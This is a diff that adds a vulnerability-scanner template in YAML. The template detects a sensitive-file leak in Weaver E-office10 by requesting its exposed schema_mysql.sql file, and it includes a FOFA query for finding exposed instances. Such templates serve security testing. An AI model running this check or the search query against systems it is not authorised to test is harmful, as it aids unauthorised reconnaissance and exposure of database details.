@@ -1,0 +1,15 @@
+id: poc-yaml-weaver-e-office10-schema-mysql-sql-sensitive-info-leak
+info:
+  name: 泛微E-office10 schema_mysql.sql 敏感信息泄露漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: e-office10
+  fofa: body="eoffice_loading_tip" && body="eoffice10"
+requests:
+- method: GET
+  path: /eoffice10/empty_scene/db/schema_mysql.sql
+  expression: status_code == 200 && contains(body,"CREATE TABLE") && contains(body,"mysql,sqlsrv,oracle")
+    && !contains(body,"<") && contains(content_type,"application/x-sql")
+variables: {}
+transport: http
